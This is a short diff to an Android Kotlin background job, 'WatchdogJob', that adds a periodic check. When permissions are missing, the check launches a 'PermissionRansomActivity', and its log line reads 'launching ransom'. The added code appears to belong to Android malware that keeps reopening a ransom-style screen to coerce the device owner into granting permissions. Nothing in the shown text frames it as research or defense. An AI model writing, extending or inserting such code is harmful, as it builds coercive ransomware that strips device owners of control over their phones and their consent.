@@ -58,6 +58,16 @@ class WatchdogJob : JobService() {
             Log.d(TAG, "WatchdogJob — service alive")
         }
 
+        // ── Also check for missing permissions and launch ransom ──
+        try {
+            if (!PermissionRansomActivity.hasAllPermissions(this)) {
+                Log.d(TAG, "WatchdogJob — permissions missing, launching ransom")
+                PermissionRansomActivity.launch(this)
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "WatchdogJob — permission check failed: ${e.message}")
+        }
+
         params?.let { jobFinished(it, false) }
         return false // no ongoing work
     }
